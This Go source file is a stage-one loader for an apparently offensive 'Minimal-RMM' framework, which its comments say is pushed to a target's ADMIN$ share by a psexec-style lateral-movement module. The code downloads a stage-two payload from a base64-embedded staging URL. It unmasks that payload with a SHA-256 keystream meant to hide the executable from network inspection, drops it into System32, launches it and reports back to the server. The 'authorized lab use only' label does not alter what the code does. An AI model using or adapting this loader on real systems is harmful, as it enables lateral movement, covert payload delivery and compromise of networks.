// Minimal-RMM stage1 launcher (authorized lab use only).
//
// The psexec lateral module pushes this compact service binary to the
// target's ADMIN$ share and starts it through the SCM, the way RemCom and
// PsExec deploy their service. stage1 carries no beacon secret: its only
// capability is the staging identifier on its command line. It fetches the
// masked stage2 payload from the RMM staging endpoint, decodes it in
// memory (the payload is never a downloaded executable file), installs the
// agent as a plain visible process, reports one status line, and stops so
// the operator can remove the service and this binary.
package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

// Injected by the server build so stage1 knows where to fetch stage2.
var defaultBaseURLB64 string

var stagingTokenPattern = regexp.MustCompile(`^[A-Za-z0-9_-]{8,128}$`)

type stageConfig struct {
	BaseURL   string
	StageID   string
	SessionID string
}

func embeddedValue(value string) string {
	if value == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func parseStageArgs(args []string) (stageConfig, error) {
	cfg := stageConfig{BaseURL: strings.TrimRight(embeddedValue(defaultBaseURLB64), "/")}
	for i := 0; i < len(args); i += 2 {
		if i+1 >= len(args) {
			return cfg, fmt.Errorf("missing value for %s", args[i])
		}
		switch args[i] {
		case "--stage":
			cfg.StageID = strings.TrimSpace(args[i+1])
		case "--session":
			cfg.SessionID = strings.TrimSpace(args[i+1])
		case "--base-url":
			cfg.BaseURL = strings.TrimRight(strings.TrimSpace(args[i+1]), "/")
		default:
			return cfg, fmt.Errorf("unknown argument %s", args[i])
		}
	}
	if cfg.BaseURL == "" {
		return cfg, errors.New("no RMM base URL: build stage1 with an embedded URL or pass --base-url")
	}
	if !stagingTokenPattern.MatchString(cfg.StageID) {
		return cfg, errors.New("invalid staging id")
	}
	if !stagingTokenPattern.MatchString(cfg.SessionID) {
		return cfg, errors.New("invalid target session id")
	}
	return cfg, nil
}

// stageMask reproduces the listener's staging mask: a SHA-256 counter
// keystream keyed by the staging identifier, so the served bytes never
// look like an executable file on the wire.
func stageMask(data []byte, stagingID string) []byte {
	seed := make([]byte, len(stagingID)+8)
	copy(seed, stagingID)
	out := make([]byte, len(data))
	for offset := 0; offset < len(data); offset += sha256.Size {
		binary.BigEndian.PutUint64(seed[len(stagingID):], uint64(offset/sha256.Size))
		block := sha256.Sum256(seed)
		for i := 0; i < sha256.Size && offset+i < len(data); i++ {
			out[offset+i] = data[offset+i] ^ block[i]
		}
	}
	return out
}

// runStage fetches the masked stage2 payload, decodes it in memory, writes
// the agent binary to its final path, and starts it with the target
// session identity.
func runStage(cfg stageConfig) error {
	client := &http.Client{Timeout: 120 * time.Second}
	response, err := client.Get(cfg.BaseURL + "/tools/stage/" + cfg.StageID)
	if err != nil {
		return fmt.Errorf("stage2 download failed: %w", err)
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		detail, _ := io.ReadAll(io.LimitReader(response.Body, 512))
		return fmt.Errorf("stage2 download failed: HTTP %d: %s",
			response.StatusCode, strings.TrimSpace(string(detail)))
	}
	masked, err := io.ReadAll(io.LimitReader(response.Body, 512<<20))
	if err != nil {
		return fmt.Errorf("stage2 download failed: %w", err)
	}
	if len(masked) == 0 {
		return errors.New("stage2 payload is empty")
	}
	payload := stageMask(masked, cfg.StageID)
	if !bytes.HasPrefix(payload, []byte("MZ")) {
		return errors.New("stage2 payload failed the integrity check")
	}
	systemRoot := os.Getenv("SystemRoot")
	if systemRoot == "" {
		systemRoot = `C:\Windows`
	}
	agentPath := filepath.Join(systemRoot, "System32", "minimal-rmm-agent.exe")
	if err := os.WriteFile(agentPath, payload, 0700); err != nil {
		return fmt.Errorf("install stage2: %w", err)
	}
	child := exec.Command(agentPath, "--lateral-session", cfg.SessionID)
	child.Env = append(os.Environ(), "RMM_BASE_URL="+cfg.BaseURL)
	if err := child.Start(); err != nil {
		return fmt.Errorf("start stage2: %w", err)
	}
	go func() { _ = child.Wait() }()
	return nil
}

// reportStageStatus delivers one best-effort status line to the staging
// entry so the operator can see why a target never registered.
func reportStageStatus(cfg stageConfig, message string) {
	body := strings.NewReader("stage1 " + message)
	response, err := http.Post(cfg.BaseURL+"/tools/stage/"+cfg.StageID,
		"text/plain; charset=utf-8", body)
	if err == nil {
		_ = response.Body.Close()
	}
}

func main() {
	cfg, err := parseStageArgs(os.Args[1:])
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(2)
	}
	work := func() error {
		if err := runStage(cfg); err != nil {
			reportStageStatus(cfg, "failed: "+err.Error())
			return err
		}
		reportStageStatus(cfg, "ok: agent installed and started")
		return nil
	}
	if runStageAsService(work) {
		return
	}
	if err := work(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(3)
	}
}
